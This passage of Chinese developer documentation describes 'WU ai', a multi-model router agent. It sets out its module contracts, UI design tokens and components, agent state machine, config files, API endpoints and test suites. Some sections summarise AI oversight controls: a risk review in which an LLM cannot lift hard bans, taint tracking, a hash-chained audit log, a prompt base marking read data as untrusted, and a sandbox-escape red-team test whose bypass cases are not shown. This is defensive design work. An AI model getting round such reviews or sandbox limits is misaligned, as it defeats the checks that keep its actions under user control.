| `index.js` | 事件接线与编排（pre-step/request/status/session-event/pre-execute） | `name` `inject` `apply` | 全部模块 | 不写业务规则（规则在对应模块） |
| `analyzer.js` | 任务分类（正则规则，不用模型） | `analyzeTask` `extractContent` | — | 不发任何模型调用 |
| `registry.js` | 模型注册表 + 资格过滤与评分排序 | `buildRegistry` `rankModels` `reliabilityFactor` | perf | 不发起模型调用、不管理 Key |
| `brain.js` | Router Brain：任务能力分析 + 模型研究 + intel 排序 | `analyzeTaskByBrain` `researchModel` `rankByIntel` | prompts, perf | 不直接选模型（输出供 rankByIntel 用） |
| `intel.js` | 三层能力档案（declared/research/actual）+ 表现回写 | `effectiveScore` `syncActualFromPerf` | perf | 不虚构证据；actual 必须来自真实任务 |
| `multi.js` | 线性多模型执行器（≤2 步）+ 统一模型调用 | `runOne` `shouldMultiExecute` `multiExecute` | registry, perf, context, prompts | 不写文件、不改 UI 状态 |
| `planner.js` | Planner（强模型 DAG）+ Scheduler（拓扑波次） | `planTasks` `parsePlan` `executeDAG` | multi(runOne), registry, perf, context | 规划失败必须返回 null 回退，不得抛异常阻断 |
| `verifier.js` | 独立质检（另一模型打分） | `verifyAnswer` `extractAssistantText` | prompts, perf | 评分不作主视觉；不给修复操作（修复走 inject） |
| `risk-review.js` | 执行前风险审查（三层：硬规则→AI→策略）+ 污点 + 审计链 | `evaluatePolicy` `buildPacket` `reviewWithModel` `audit` `markTainted` `verifyAuditChain` | prompts | **LLM 无权放行硬性禁令**；审查故障保守 ask，绝不自动放行 |
| `context.js` | Context Manager（TaskState/产物/分层构建） | `createTaskState` `updateFromAnalysis` `updateFromVerify` `addArtifact` `buildSubtaskContext` `buildVerifyContext` | —（纯函数） | 硬约束/已确认事实永不裁剪；主模型会话历史不动 |
| `perf.js` | Performance Log（追加 jsonl + 汇总） | `logPerf` `logLlm` `readPerf` `summarize` | — | 缺失值保留为空，不估算冒充 |
| `prompts.js` | Prompt 模板中心（角色系统段统一） | `PROMPT_BASE` `SYSTEMS` `jsonOnly` | — | 不读状态、不拼用户数据（用户数据一律走 body） |

**Prompt 契约**：三要素基础段 `PROMPT_BASE`（简体中文 + 不可信数据声明 + 职责内分析）所有内部调用共享，禁止各模块重复手写；每个角色一套 `SYSTEMS.<role>`，新增调用角色时**先加模板再写调用**；用户/上游数据一律进 body 段并标注「待审查数据/任务文本」。

**Token 效率约定**：子任务上下文预算 3000 字符（≈1000 tokens），硬约束与已确认事实永不裁剪，超预算先截 goal 再丢产物摘要；贵调用每轮一次（Brain/规划按轮去重，mid-loop inject 不重复触发）；每次模型调用记 `logLlm`（usage）与 `logPerf`，缺失值留空。

---

## 7. 控制中心 UI

设计规范全部在此（自包含，无外部参照稿）。前端代码在 `ui/`（§3 有模块地图），改 UI 前读本章。

### 7.1 设计定位与硬规则

**禅意终端 + 工程调度台**：深墨底色、等宽字体、单一强调色、状态先行、渐进式披露。

| 维度 | DSH | WU ai |
|---|---|---|
| 定位 | 网页应用面板 | 工程调度台 |
| 结构 | 配置导向、菜单居中 | 状态导向、调度台常驻右侧 |
| 圆角 | 大圆角（menu 20px+） | **≤ 8px**（例外：胶囊徽章/头像） |
| 强调色 | 蓝灰系 | **单一悟绿** `#2EE59D`，无第二强调色 |
| 信息暴露 | 直接展示配置 | **渐进式披露**（见 §7.7） |
| 装饰 | 常规卡片阴影 | 极克制的发光/网格底纹 |

四条硬规则：① 全应用只允许 `--zen` 一个强调色，语义色（琥珀/红）仅用于状态不做装饰；② 卡片/按钮/输入框一律 4~8px 圆角，仅徽章/胶囊用 16~20px；③ 任何时刻用户都能从顶栏徽章知道系统在干什么；④ UI 文案一律人类语言（术语映射见 §7.8）。

### 7.2 设计 Token

```css
/* 背景层（由深到浅，四层） */
--bg-deep:      #08090B   /* 代码块、终端块、内嵌深槽 */
--bg-base:      #0D0F12   /* 页面底色 */
--bg-panel:     #13161C   /* 卡片、面板、顶栏、输入区 */
--bg-element:   #1B2028   /* 次级容器、hover 底、按钮底 */

/* 描边（两层） */
--border-color: #242B35   /* 常规描边（最常用） */
--border-light: #2D3643   /* 强调描边、hover 描边 */

/* 强调色（唯一） */
--zen:          #2EE59D   /* 主强调 / 就绪 / 成功 / 主按钮 */
--zen-soft:     rgba(46,229,157,.10)   /* 选中底、徽章底 */
--zen-glow:     rgba(46,229,157,.22)   /* 发光阴影 */

/* 语义色（仅状态，不装饰） */
--amber:        #FFB020   /* 工作中 / 降级 / 警告 / 缺 Key */
--amber-soft:   rgba(255,176,32,.10)
--red:          #FF7B72   /* 危险操作 hover / 失败 */

/* 文字（三级） */
--text-main:    #E2E8F0   /* 正文、标题 */
--text-muted:   #8A99AD   /* 次要说明、标签 */
--text-dim:     #56637A   /* 元信息、时间戳、占位 */

--font-mono: 'JetBrains Mono', 'SF Mono', Menlo, monospace;   /* 界面主字体 */
--font-sans: 'Inter', -apple-system, 'PingFang SC', 'Microsoft YaHei', sans-serif;
--r: 6px                                                        /* 圆角默认值 */
```

**页面底纹**（营造终端质感，勿删）：

```css
background-color: var(--bg-base);
background-image:
  radial-gradient(1100px 500px at 12% -8%, rgba(46,229,157,.05), transparent 60%),  /* 左上角绿晕 */
  radial-gradient(rgba(226,232,240,.045) 1px, transparent 1px);                      /* 26px 网格点阵 */
background-size: auto, 26px 26px;
```

**等宽字体是界面主字体**（不是备选）——`font-sans` 只用于两处：用户气泡正文、长段中文说明。代码块语法色：关键字 `#CC7832` · 函数 `#FFC66D` · 字符串 `#6A8759` · 注释 `#64748B`（italic）。

**字阶**：26px 启动台主标题 · 14px 消息正文/路由器条目名 · 13px 用户气泡/品牌名/模型名/代码块 · 12.5px 代码块正文 · 12px 卡片标题/列表行/输入框/状态徽章/Toast · 11px 字段标签/元信息/小按钮/侧栏项 · 10px 徽章。等宽文本统一 `letter-spacing: 0.5~2px`（分区标签大写 + 2px 字距）；正文行高 1.7，终端日志行高 2；数值/路径/ID 一律等宽（「工程味」的关键来源）。

**间距**（4px 栅格）：4px 图标与文字 · 6px 按钮组内 · 8px 默认行内（最常用）· 10px 表单字段内部 · 12px 卡片内元素 · 14px 卡片 padding 纵向上限 · 16px 弹窗 body · 18px 卡片横向 padding · 20px 消息之间 · 22px 启动台区块之间 · 28px 页面级 padding。

**圆角**：3px 用户气泡尖角侧/kbd · 4px 小按钮/内联徽章 · 5px 图标方块/次要按钮 · **6px 默认**（输入框/卡片内块/Toast/主按钮）· 8px 卡片/工作流面板 · 10px 弹窗卡片 · 12px 用户气泡主体 · 16px 引导步骤胶囊 · 20px 状态徽章 · 50% 状态点。**用户气泡非对称圆角** `12px 12px 3px 12px`（右下收尖，指示发出方向）。

**阴影与发光**：Toast `0 8px 24px rgba(0,0,0,.4)` · Modal `0 24px 64px rgba(0,0,0,.6)` · 遮罩 `rgba(6,8,10,.72)` · 状态点 `0 0 6px var(--zen)` · 主按钮 `0 0 16px var(--zen-glow)`（hover 22px）。**发光只给强调元素**（主按钮、状态点、关键节点徽章），不给卡片。

**布局与尺寸**：顶栏 48px · 品牌章 24×24（启动台大标题版 46×46）· 启动台内容宽 max-width 1080px · 对话内容宽 860px · 右侧调度台 252px（≤1080px 视口隐藏）· 滚动条 6px · 输入框初始 44px 最高 120px（自动增高）· 状态点 6~7px。**响应式**：≤1080px 隐藏调度台/启动台栅格降单列 · ≤1040px 隐藏品牌后缀 · ≤880px 隐藏顶栏徽章（**右上角运行控制按钮最后才让位**）· ≤760px 导航按钮收紧。

**动效**（必须有理由，单次过渡 ≤300ms）：状态点 `pulse` 2s（idle）/`blink` 1s（working）· hover/展开 `all .15s ease` · Toast/横幅进入 `opacity + translateY(4~6px)` `.18~.3s` · 菜单位置重排 `transform .2s` · 进度条 `width .6s`。

### 7.3 组件规范

| 组件 | 规范 |
|---|---|
| 按钮 `.btn` | 底 `--bg-element`，描边 `--border-light`，padding `8px 16px`，圆角 6px。`.primary` 底/描边 `--zen`，文字 **`#06231A` 深墨色**（对比度 ≥4.5:1，**禁止白字绿底**），字重 700，发光。`.ghost` 透明底（回滚/重登/退出）。`.sm` padding `4px 11px` 11px 字（顶栏运行控制）。`:disabled` opacity .45。`.mbtn` 列表行内小按钮，`.danger:hover` 转红 |
| 状态徽章 | 胶囊（圆角 20px）+ 7px 状态点 + 文案（12px 等宽）。变体 `.idle`（绿脉冲）· `.working`（琥珀快闪）· `.ok`（绿常亮）· `.warn`（琥珀常亮）。**顶栏徽章是唯一状态源** |
| 状态点 | 6px 圆点 + 11px 文字；`.warn` 变琥珀并闪烁 |
| 徽章 Badge | 10px 字、圆角 10px、`--border-color` 描边；`.on`（绿）· `.warn`（琥珀） |
| 输入 `.io` | 底 `--bg-base`、圆角 6px、padding `6px 10px`、12px 等宽；聚焦描边转 `--zen` + 发光 |
| 卡片 | 底 `--bg-panel`、圆角 8px、padding `16px 18px`、纵向 gap 12px；标题 12px 等宽大写、字距 1px、`--text-muted`，右侧可挂 `.tag` |
| 列表行 `.mrow` | 栅格 `1fr auto`，hover 描边提亮 |
| 弹窗 | 遮罩 `rgba(6,8,10,.72)` 居中；卡片 max-width 520px（确认框 420px）、max-height 88vh 可滚；三段式（head/body/foot 右对齐）。**禁止原生 `confirm()`/`alert()`**，确认类统一自绘（返回修改 / 继续） |
| Toast | 右下角固定，容器 `pointer-events: none` + 单项 auto（不拦截操作）；`--bg-panel` 底 + 左侧 2px `--zen` 竖条，停留 3.2s |
| 警示横幅 | `--amber-soft` 底 + 琥珀描边，右侧可挂 `✓ 已切换` 结果标记；**必须在原地解决，不只报错** |
| 代码块 | `--bg-deep` 底 + 头部条（文件名 · 语言），正文 12.5px 等宽横向可滚 |
| 图标 | 14×14 viewBox 16 内联 SVG，`stroke-width: 1.3~1.5`，`fill: none`，`currentColor`；几何线性、无 emoji 替代 |
| 行内流水线 `.step-chip` | 圆角 10px 胶囊、11.5px 等宽；`done` 悟绿 + 淡底、`run` 琥珀 + 淡底（标记闪烁）、`pending` 灰描边、`skip` 虚线；步骤间 `›` 分隔，右侧跟已用时长与选型理由（超出截断）。**只反映真实埋点，没有事件就保持待命** |

### 7.4 信息架构与页面结构

**一个页面、两个视态、一个抽屉。** 没有「控制台 / 对话页」两个 Tab，也没有跳页与新标签：
打开软件就是发射态，派发即在同一块主舞台切成执行态，回看与配置都在抽屉里。

```
WU ai（单页工作台 · :3780）
├── 顶栏：WU 印 · [+ 新建任务] [当前任务] · 环境胶囊 · 状态徽章（唯一状态源）· 启动/停止 · ⚙ 舰队
├── 左栏（240px，导航）
│   ├── 近期任务：影子快照链（标题 · 时间 · +增 −删），点击只读回看那一次任务改了什么
│   └── ⚙ 设置与运行时
├── 主舞台
│   ├── 视态 A · 发射态：居中大输入框（视觉重心）+ 预估路由 + 强制模型 + 模板胶囊
│   └── 视态 B · 执行态：行内四步流水线 + 本轮改动胶囊 + 对话面 + 未运行空状态
└── 抽屉（按需滑出）：wu doctor · FLEET · WORKFLOWS · TASK DIFF · RUN TRACE ·
    RISK GUARD · RUNTIME · SANDBOX POLICY · FIRST RUN · ENVIRONMENT · SYSTEM
```

原有「工作台」上的常驻模块全部归位，主屏不再有静态死图：

| 原工作台模块 | 为什么不能常驻主屏 | 单页模式下的归宿 |
|---|---|---|
| LIVE PIPELINE 流水线示意 | 没有任务时只是一张静态图 | 执行态顶部行内四步胶囊（真实埋点驱动，SSE 推送） |
| WORKFLOWS 模板列表 | 只用于快速发起任务 | 发射台输入框下方的快捷胶囊；管理移入抽屉 |
| FLEET 模型舰队 / 路由 | 配置一次后极少改动 | 顶栏「⚙ 舰队」→ 抽屉 |
| wu doctor 环境信息 | 低频排错数据 | 顶栏状态胶囊（一行）→ 抽屉详情 |
| RISK GUARD / TASK DIFF / RUN TRACE | 只在排查与回看时需要 | 抽屉（执行态「查看轨迹」「改动」直接定位） |

**核心原则：普通用户不应感知 DSH。** 用户认为自己在使用「WU ai」，而不是「DSH + wu-ai-router + Cordis + llama.cpp」。DSH 是底层 Runtime，只在「技术细节」里以只读形式出现。

### 7.5 核心流程

- **首次启动**：双击 start.command → 环境自检 → 配置模型 → 启动 Agent → 进入对话页
- **首次聊天**：输入任务 → 分析任务 → 选择模型 → 执行 → 核验结果 → 输出
- **多模型任务**：任务 → 拆解为多路能力需求 → 分派各模型 → 合并 → 核验 → 输出
- **模型失败**：不可用 → 重试 → 切换备份模型 → 继续执行 → 输出（**UI 必须在原地给出「已切换」的明确结论，不能只报错**）
- **添加本地模型**：+ 添加 → 本地 → 检测硬件 → 安装 llama.cpp → 选模型文件 → 填 ID + Base URL → 保存
- **更新 Runtime**：检查更新 → 下载新版 → 兼容测试 → 切换 → 健康检查；失败 → 自动回滚上一版本（应急通道不回测）
- **运行控制**：启动 Agent（按钮变运行中、自动进对话页）· 停止（确认框 → 保留历史）· 重新登录（刷新凭据）· 退出（确认框 → 停 Agent 并退出）

### 7.6 Agent 状态机

```
IDLE → ANALYZING → ROUTING → EXECUTING → VERIFYING → COMPLETED → IDLE

异常分支：
VERIFYING ──(不达标)──→ RETRY ──→ EXECUTING
VERIFYING ──(重试耗尽)─→ FAILED
EXECUTING ──(模型不可用)─→ FALLBACK ──→ EXECUTING
```

### 7.7 渐进式披露（三层）

避免把路由/核验的内部细节一次性砸给用户。

**第 1 层 · 默认可见**：执行态顶部一行四步胶囊 + 已用时长（意图分流 › 模型分派 · 模型名 › 执行 › 沙箱核验）；
对话面里折叠后是 `⚡ 4 步流水线 · 12.4s · 已核验`——只回答走到哪一步、用了谁、有没有核验、花了多久。

**第 2 层 · 展开工作流**（点摘要行）：

```
1  分析任务                    识别需求：工程实现 · 并发推理 · 内存屏障
2  选择模型  ✦ 自动            视觉 → MiMo / 推理 → Kimi / 工程 → GLM
                              依据：任务同时需要代码与并发推理，拆成三路并行
3  执行  3 路并行               MiMo 已返回 · Kimi 已返回 · GLM 已返回
4  核验结果                     ✓ 完整性 / ✓ 一致性 / ✓ 需求覆盖 / ✓ 工具执行
```

选模步骤必须回答**「为什么是这些模型」**——这是 WU 的技术优势转化为用户可理解体验的关键。

**第 3 层 · 技术细节**（再点一次）：`Analyzer 规则分类 · 0.2s · 无 Token 消耗` / `Vision mimo-v2.5 · 0.8s · 412 tok` / `Verifier 检查 4 项通过 · 无重试`。

**Verifier 反馈极度克制**：用户不关心「打了 87.4 分」，只关心「结果可靠吗」。通过 → `✓ 结果已核验，质量通过`；重试中 → `⚠ WU 检测到可能的问题，正在重新评估…`；耗尽 → `⚠ 结果可能不完整` + 原因一句话。**禁止**每次回答弹评分、把分数作为主视觉。

### 7.8 状态语义与术语映射

| 状态 | 视觉 | 文案示例 |
|---|---|---|
| 就绪 | ● 绿常亮/脉冲 | `就绪 · 3 模型在线` |
| 工作中 | ◌ 琥珀闪烁 | `◌ 分析任务` `⇄ 选择模型` `⇄ 3 模型并行` |
| 核验中 | ⟳ 琥珀 | `✓ 核验结果` |
| 完成 | ✓ 绿 | `结果已核验，质量通过` |
| 降级 | ⚠ 琥珀 | `⚠ GLM 不可用 · 切换备份` |
| 已停止 | ■ 琥珀 | `■ 已停止` / `■ 已退出` |
| 缺 Key | 琥珀徽章 | `缺 Key` |

状态必须**双通道表达**（颜色 + 文字/符号），不可只靠颜色。顶栏徽章是唯一状态源：任何流程变化都必须同步它，不允许「页面某处说在跑、徽章说就绪」。

**术语映射（硬约束）**——UI 一律不显示左侧内部名，只显示右侧人类语言：

| 内部实现 | UI 文案 |
|---|---|
| `agent/pre-step` / Task Analyzer | 正在分析任务 |
| Model Router | 正在选择合适的模型 |
| Multi-Model Executor | 执行 · N 路并行 |
| Verifier | 正在检查结果 / 结果已核验 |
| Router Brain | Router Brain（专有名词，保留并解释用途） |
| 模型 provider 名 | 模型显示名 |

唯一例外：用户主动展开「技术细节」后，才允许出现 Analyzer / Router / 模型 ID / 延迟 / Token / 重试次数。

### 7.9 权限确认与异常恢复

**破坏性操作必须二次确认**（自绘确认框，返回修改 / 继续）：删除模型（「密钥会一并从密库移除，此操作不可撤销」）· 停止 Agent（「任务会被中断，对话历史会保留」）· 退出（「下次双击 start.command 可重新启动」）。沙箱权限属运行时既定边界，不逐次询问；越界时给出明确拒绝原因而非静默失败。

| 异常 | 用户可见 | 恢复动作 |
|---|---|---|
| 模型 API 失败 | `⚠ GLM 5.2 不可用，WU 正在切换到备份模型 → Kimi` + `✓ 已切换` | 自动切换备份模型，原地续跑 |
| Router Brain 不可用 | `⚠ Router Brain 未启动，使用规则路由继续` + `✓ 已回退` | 自动回退规则分类 |
| 第三方模型不认 `reasoning_effort` | 右下角非阻塞 Toast：`当前模型不支持设置思考强度，已改用默认强度继续` | 剥离该参数重发，不中断对话 |
| 本地模型未运行 | `⚠ 本地模型未运行` | 提供「启动模型 / 改用云端」 |
| Runtime 升级失败 | 报告失败阶段 + `已自动回滚到上一版本` | 自动回滚 |
| 控制中心未启动 | 工作台面板显示「控制中心不可达」 | 提示「需要完整功能请启动控制中心」 |

**共同要求**：① 异常不阻断主流程，能自动恢复的必须自动恢复；② 恢复结果必须明确可见（`✓ 已切换`），不能静默；③ 提示不遮挡工作区（Toast 右下角）；④ 文案面向用户（「已改用默认强度」），不暴露参数名与内部错误码。

**文案规范**：全部简体中文，专有名词（JetBrains Mono / llama.cpp / Router Brain）保留原文；不用感叹号、不用营销腔；说清楚「发生了什么 + 现在怎么办」；数字带单位与千分位（`12.4s` / `3,412`）；刻意避免 em dash（—），用短横或冒号保持终端式简洁。

### 7.10 前端结构与无障碍

前端为 ES modules（`index.html` 以 `type="module"` 加载 `app/main.js`，模块加载即完成事件绑定与事件订阅）。分三层：

- **视态层**：`shell.js` 是「现在该看发射态还是执行态」的唯一真源（`setView` + `onView`），只改 `hidden` / `data-view`，不碰业务状态；
- **数据域**：`sidebar.js`（任务历史）、`pipeline.js`（流水线事件）、`workspace.js`（模板/风险）、`models.js`、`runtime.js`、`doctor.js`、`trace.js`、`shadow.js`、`agent.js` 各自渲染自己的区域；
- **基础层**：`dom.js`（零依赖工具）、`state.js`（state 单一持有 + 事件总线 + `fetchCatalog`）。

跨模块用 10 行事件总线解耦（`catalog`/`models`/`hardware` 三种事件，订阅者在各渲染域），避免互相 import 成环；`pollDsh` 就绪前走轻量 `refreshModelsOnly`（DSH 未就绪时 `dsh=null` 会把运行态 UI 复位）。执行态的流水线**不走事件总线**：事件来自服务端按字节偏移增量推送的 SSE（`/api/task-stream`），断线后自动切到 2.5s 轮询（`/api/task-events?offset=`），两条路共用同一份解析逻辑。

- 正文与背景对比度 ≥ 4.5:1；`--text-dim` 仅用于非关键元信息
- 主按钮用深墨文字，不用白字绿底
- 焦点可见：输入类统一 `--zen` 描边 + 发光，不允许 `outline: none` 且无替代
- 状态不单靠颜色：状态点旁始终跟文字，色盲可辨
- 键盘可达：对话页 `Tab` 展开工作流、`F1` 重播、`Ctrl+L` 清屏；弹窗为独立确认交互
- 触达尺寸：可点区域不低于 24px 高

### 7.11 UI 改动检查清单

- [ ] 只用了 `--zen` 一个强调色？语义色仅用于状态？
- [ ] 圆角 ≤ 8px（徽章/胶囊除外）？间距落在 4px 栅格、用 token 而非随手数值？
- [ ] 字体以等宽为主？数值/路径/ID 都是等宽？
- [ ] 状态是否「颜色 + 文字」双通道表达？状态变化同步了顶栏徽章？
- [ ] 是否用了原生 `confirm()`/`alert()`？（不允许）
- [ ] 是否暴露了内部术语（Analyzer / Model Router / provider 名）？
- [ ] 发光是否只出现在强调元素上？窄屏下右上角运行控制按钮是否仍可见？
- [ ] 默认视图是否只暴露第 1 层信息？自动路由是否给出「为什么选这些模型」？
- [ ] 异常是否原地恢复 + 明确告知结果？提示是否可能遮挡工作区？
- [ ] 视态切换是否就地完成（不跳页、不开新标签、不等网络）？
- [ ] 执行态的进度是否来自真实埋点（没有埋点就不该有动画）？

---

## 8. 对话面（DSH 内嵌）

- **只保留 WU 模式**（DSHY 模式与原版四预设已于 2026-10-13 移除）：预设列表里只有「WU 模式」，路由层恒活跃，不再有原版体验切换。
- 侧栏在原生会话/工作区之上补齐「**工作能力**」（任务中心 / 协作流程 / 质量与验证 / 工作成果 / 工作流）与「**系统**」（模型与能力 / 运行记录与用量 / 设置与权限）两区，点击弹出右侧工作台面板，数据来自本机埋点与产物仓库（空状态会明确说明，不伪造样本）。
- 品牌层：侧栏与对话首页统一为 WU 印（纯 SVG），原生品牌元素与插件管理入口已退役。
- 空白会话预设立即重组合，已产生对话的会话按 DSH 设计被锁定（切到新会话即可）。
- `/api/preset` 端点保留兼容应答（恒 wu）；配置的 `preset` 字段仅为兼容保留。

**调度台与运行期提示**（路由插件在 DSH web 内注册的两个同源只读通道）：

- `GET /wu-ai/notices?since=<seq>`：运行期提示（如「当前模型不支持思考强度，已改用默认强度」），客户端轮询后弹非阻塞 Toast
- `GET /wu-ai/dashboard?session=&limit=`：调度台数据，直接来自本机性能档案 `perf.jsonl` 的真实埋点（analyze / route / multi / execute / verify / retry / 逐次用量）。「调度台」面板按渐进式披露三层呈现（§7.7）。拿不到的字段一律不显示，绝不编造

---

## 9. 配置与数据

**控制中心配置**（`data/config.json`）：模型表（引用密库，无明文 Key）/ prefer / defaultModelId / analyzerModelId。密钥明文在 `data/secrets.json`（AES 加密，见 §5.1）。

**DSH_HOME**（`~/.wu-ai/dsh/`，避开 Desktop 权限）：

| 文件 | 内容 | 写方 |
|---|---|---|
| `settings.yaml` | llm-pi-ai providers（baseURL/apiKeyEnv/headers）+ 默认模型 | 控制中心渲染 |
| `.credentials.yaml` | env refs（代理模式为占位符，0600） | 控制中心渲染 |
| `profiles/` | profile package.json + bundles + 插件快照 | 控制中心/DSH |
| `perf.jsonl` | 路由/执行/质检/用量埋点 | 路由插件 |
| `model-intelligence.json` | 三层能力档案 | 路由插件 |
| `wu-ai-model-health.json` | 密钥核验共享快照 | 控制中心 |
| `wu-ai-risk-audit.jsonl` | 风险审计（哈希链） | 路由插件 |
| `wu-ai-budget.json` | 会话预算快照 | 路由插件 |
| `wu-ai-policy.json` | 托管沙箱策略（0600） | 控制中心 |
| `wu-ai-router.log` | 路由插件日志 | 路由插件 |
| `wu-ai-context/` | 产物仓库全文 | 路由插件 |

> **沙箱工作区**（`~/WU-ai-Work/`）：Agent 的全部文件产出；`.wu-shadow-git/` 是控制中心的影子仓库（派发前自动快照、供 TASK DIFF 与「撤销本次任务改动」），藏在自己名下，**不碰用户在工作区里可能已有的 `.git`**，也不会出现在 `/api/files` 与 diff 里。

---

## 10. API 全表

**控制中心**（`server/app.py`，端口 3780）：

| 端点 | 方法 | 用途 |
|---|---|---|
| `/api/status` | GET | 运行状态 + 心跳活性（clientSeenAgo/agentSeenAgo） |
| `/api/catalog` | GET | 模型/能力/偏好/节点/DSH/沙箱/**策略**/**凭据代理**状态全量 |
| `/api/config` | POST | 保存配置（prefer/defaultModelId/analyzerModelId） |
| `/api/models` | POST | 增/改单个模型 |
| `/api/models/delete` | POST | 删除模型（同步清密库孤儿密钥） |
| `/api/launch` | POST | 启动 Agent |
| `/api/reauth` | POST | 刷新凭据（停→起） |
| `/api/stop` | POST | 停止 Agent |
| `/api/exit` | POST | 退出控制中心（先停 Agent 再关服务） |
| `/api/heartbeat` | GET | 页面心跳 |
| `/api/workspace` | GET | 工作台聚合（执行/验证/计划/路由/用量/产物/**风险审计**/**预算**） |
| `/api/workflows` | GET/POST | 工作流模板（save/delete） |
| `/api/pending-task` | GET/POST | 发射台任务投递箱（GET 即消费；`peek=1` 只读） |
| `/api/tasks` | GET | 近期任务：影子快照链 + 每次任务的改动统计 + 排队中的任务 |
| `/api/files` | GET | 沙箱文件树（`?path=&depth=`，路径经 `guard` 校验，越界 403） |
| `/api/task-events` | GET | 流水线事件增量（`?offset=` 字节偏移；SSE 的回退通道） |
| `/api/task-stream` | GET | 流水线事件 SSE（执行态四步实时推送，15 分钟或断开即结束） |
| `/api/shadow/snapshot` | POST | 派发前打影子快照（`label` 记任务文本） |
| `/api/shadow/diff` | POST | 单文件 diff（`path`；`commit`/`to` 指定历史快照区间） |
| `/api/shadow/accept` | POST | 确认保留某些文件的改动（并入快照链） |
| `/api/shadow/rollback` | POST | 撤销改动（`files` 为空表示全部；新建文件删除、修改文件还原） |
| `/api/hardware` | GET | 硬件检测 |
| `/api/llama/install` | POST | 安装 llama.cpp |
| `/api/install-node` | POST | 安装便携 Node |
| `/api/intel/research` | POST | Router Brain 连通性自检 |
| `/api/runtimes` | GET | 运行时清单 + 兼容测试 + 升级状态 |
| `/api/runtimes/check` | POST | 检查更新 |
| `/api/runtimes/upgrade` | POST | 一键升级（后台编排） |
| `/api/runtimes/switch` | POST | 切换运行时（先跑兼容测试） |
| `/api/runtimes/rollback` | POST | 应急回滚上一版本 |
| `/api/sandbox-policy` | POST | 保存托管沙箱策略 |

**对话页**（路由插件注册，同源 3080）：`/wu-ai/notices`（运行期提示）· `/wu-ai/dashboard`（调度台数据）。

---

## 11. 测试体系

```bash
python3 tests/run_all.py                 # 全量（推荐）
WUAI_LIVE_TEST=1 python3 tests/run_all.py # 追加 B 层真实 API 调用（会产生消费）
```

| 层 | 内容 | 说明 |
|---|---|---|
| D | keystore / migration / dsh_adapter / analyzer / registry / intel / pipeline / 风控治理 / **凭据代理** / **托管策略** / **审计哈希链跨语言互验** / **沙箱路径守卫** / **影子快照与历史回看** / **HTTP 面与 SSE 端到端** / **UI 模块冒烟** + 插件自测（classify/core/dynamic） | 无外部依赖，永远跑 |
| A | 入口 / 版本 / --dump-config / 补丁（全部已安装运行时） | 离线兼容，不消费 API |
| C | Start / Session / Preset / Tool / Model-switch / 插件契约（DSH 在线时） | 只读冒烟 |
| B | 直连 provider 最小 chat + SSE 流式（`WUAI_LIVE_TEST=1`） | 验证 wire 层真实性 |

**安全相关测试是常驻门禁**：`tests/router/sandbox-escape.test.mjs`（红队演练，8 条绕过用例——每次改沙箱/风险层必跑，接一条失败即说明防线回退）· `tests/test_guard.py`（`../` 穿越 / 软链接穿透 / 前缀误判 / 展示脱敏，改文件读接口必跑）· `tests/router/risk-governance.test.mjs`（mock ctx 驱动 apply()：污点外传/熔断/预算/escalation 白名单）· `tests/test_credential_proxy.py`（占位符渲染/转发注入/401·404/SSE 流式/host 白名单/热更）· `tests/test_audit_chain.py`（Node 写、Python 验的跨语言哈希链）· `tests/test_sandbox_policy.py`（默认值/校验/clamp/0600）。

Node 路径由 `tests/run_all.py` 动态发现（便携版按版本号取最新，回落 PATH 上的 node）；插件自测统一跑在临时 DSH_HOME。**测试隔离铁律**：`core/paths.DSH_HOME` 写死不读环境变量，任何测试不得依赖 env 覆盖它——用显式临时路径（曾因忽略这点把测试数据写进真实 `~/.wu-ai/`）。

---

## 12. 维护速查（改什么去哪里）

| 想改什么 | 去哪里 | 注意 |
|---|---|---|
| 换机器/换路径 | `core/paths.py` | 单一真源 |
| DSH 格式适配 | `dsh/adapter.py` | 唯一耦合面；改完跑 A 层兼容测试 |
| 运行时版本管理 | `dsh/manager.py` + `dsh/upgrade.py` | 失败自动回滚不可绕过 |
| HTTP 端点增删 | `server/app.py`（do_GET / _handle_post 两处） | 出站响应永不带明文 Key |
| 工作台数据/工作流/投递箱/沙箱自检/托管策略/流水线事件 | `server/workspace.py` | 事件只读 perf.jsonl，不伪造进度 |
| 沙箱路径访问（任何按用户相对路径读盘的接口） | `server/guard.py` | 一律 `resolve_in`，禁止自己拼路径 |
| 任务历史 / 快照 diff / 回滚 | `server/shadow.py` | 历史回看只读：`commit..to` 区间，不回滚旧快照 |
| 控制中心视态切换 | `ui/app/shell.js` | 唯一真源；不改业务状态 |
| 执行态四步流水线 | `ui/app/pipeline.js` | 事件驱动；无埋点就无进度 |
| 密钥核验刷新策略 | `server/health.py`；算法在 `core/model_health.py` | unknown 绝不当失败 |
| 密钥落 DSH 的方式 | `server/credential_proxy.py` | 直连回退在 `launcher.build_env` |
| DSH 进程起停/token | `server/launcher.py` | token 正则唯一真源在文件顶部 |
| 路由规则/选模/质检/风险 | `plugins/wu-ai-router/` 对应模块 | 模块契约见 §6.3「禁止」列 |
| 会话预算/策略值 | `~/.wu-ai/dsh/wu-ai-policy.json` | router 侧 `readPolicy` mtime 热读 |
| 对话页 UI/皮肤/图标 | `plugins/wu-ai-ui/src/` 对应模块 | 改完跑 `build.sh` 构建 + 回灌 profile |
| 控制中心 UI | `ui/app/` 对应域模块 | 设计规范见 §7；DOM 契约改 `ids`/`dom` |
| 控制中心数据刷新/事件 | `ui/app/state.js` | 事件总线唯一处 |
| 控制中心样式 | `ui/styles.css` | 死类已清零，可放心删规则 |
| Prompt 模板 | `plugins/wu-ai-router/prompts.js` | 先加模板再写调用 |

**插件源文件的 profile 同步是全自动的**：`dsh/adapter.sync_router_artifacts` 按目录发现 `*.js`（含 `allocation/`）逐文件比对回灌，不再维护 `package.json` 的文件清单——清单过期导致的「重新 install 即缺文件」事故已从根上消除。

**清理 `~/.wu-ai/dsh/` 前必须先停止 Agent**（控制中心「停止」）。运行中的会话把 `sessions/` 当作持久化后端，边跑边删会让工具调用报 `ENOENT`、旧页面永久卡在「深度求索中」；历史清空后旧会话不可恢复，请在新的对话页重新开始。

---

## 13. 重构史与关键决策

编年记录四轮重构（2026-10-13 ~ 10-24），每轮的核心决策与教训。代码现状以此为准；过程中的失败尝试不再保留。

